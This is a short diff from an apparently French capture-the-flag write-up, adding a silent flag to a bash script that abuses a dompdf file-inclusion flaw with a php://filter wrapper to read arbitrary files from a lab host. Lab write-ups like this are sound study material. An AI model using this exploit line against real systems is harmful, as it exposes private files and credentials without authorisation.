@@ -122,7 +122,7 @@ J'ai donc fait un petit script en bash qui permet d'automatiser la procédure de
 
 read -p 'Entrez un fichier : ' file
 
-curl http://10.10.10.67:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$file -o /tmp/nuts
+curl -s http://10.10.10.67:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$file -o /tmp/nuts
 
 a=`cat /tmp/nuts`
 b=${a#*'[('}
